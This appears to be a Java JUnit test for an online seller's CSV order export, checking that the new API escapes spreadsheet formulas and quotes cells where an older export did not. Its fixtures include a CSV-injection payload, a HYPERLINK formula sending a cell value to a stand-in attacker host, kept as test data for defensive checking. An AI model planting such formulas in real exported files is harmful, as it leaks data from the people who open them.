package com.kartwala.export;

import org.junit.jupiter.api.Test;

import java.math.BigDecimal;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Written first. The old export loaded every order into a list and joined the cells with commas into one String.
 * A year of orders ran the server out of memory, and a product named =HYPERLINK(...) became a working link the
 * moment the seller opened the file. These tests run the old way and the API on the same orders.
 */
class FormulaAndMemoryTrapTest extends ApiTest {

    record Row(String ref, String product, int quantity, long paise, String city) {
    }

    @Test
    void theOldWayHeldEverythingAndPassedTheFormulaOn() {
        List<Row> all = jdbc.sql("SELECT order_ref AS ref, product_name AS product, quantity, amount_paise AS paise, buyer_city AS city FROM orders WHERE seller_id = 1 ORDER BY placed_at")
                .query(Row.class).list();   // every row at once
        String csv = String.join("\n", all.stream().map(r -> String.join(",", r.ref(), r.product(), "" + r.quantity(),
                BigDecimal.valueOf(r.paise(), 2).toPlainString(), r.city())).toList());   // the whole file at once
        assertThat(csv.lines()).anyMatch(l -> l.startsWith("KW-1003,=HYPERLINK("));   // a formula cell
        assertThat(csv.lines().filter(l -> l.startsWith("KW-1001")).findFirst().orElseThrow().split(",")).hasSize(6);   // "kurta, blue" split in two
    }

    @Test
    void theApiNeutralisesFormulasAndQuotesCells() throws Exception {
        List<String> lines = lines(export("neha.store", "2026-01-01", "2026-12-31"));
        assertThat(lines).contains(
                "KW-1001,2026-01-05 10:15,\"Cotton kurta, blue\",2,1299.00,Pune,DELIVERED",
                "KW-1003,2026-06-30 18:29,\"'=HYPERLINK(\"\"http://evil.example/?d=\"\"&A1,\"\"Click for refund\"\")\",1,99.00,Delhi,PLACED",
                "KW-1004,2026-07-01 09:00,'+91 Special offer,3,597.00,'@Mumbai,CANCELLED");
    }
}
